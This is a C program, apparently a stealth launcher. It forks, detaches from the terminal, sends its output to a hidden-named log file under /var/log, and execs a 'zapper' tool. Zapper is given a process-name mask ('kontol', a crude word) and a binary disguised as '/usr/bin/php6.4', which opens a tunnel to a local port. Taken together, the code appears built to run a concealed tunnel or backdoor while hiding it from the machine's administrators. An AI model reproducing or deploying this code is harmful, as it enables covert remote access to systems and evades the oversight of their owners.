#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

int main(void) {
    pid_t pid = fork();

    if (pid < 0) {
        return 1;  // fork failed
    }

    if (pid == 0) {
        // CHILD PROCESS – run silent

        // Open log file for writing
        int fd = open("/var/log/.cache.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd < 0) _exit(1);

        // Redirect stdout & stderr → log file
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        close(fd);

        // Detach from terminal fully
        setsid();

        // Exec zapper
        char *argv[] = {
            "/usr/local/bin/zapper",
            "-f",
            "-a",
            "kontol",
            "/usr/bin/php6.4",
            "tunnel",
            "--url",
            "http://localhost:8090",
            NULL
        };

        execv(argv[0], argv);

        // If exec fails
        _exit(1);
    }

    // PARENT: exit immediately (silent)
    return 0;
}
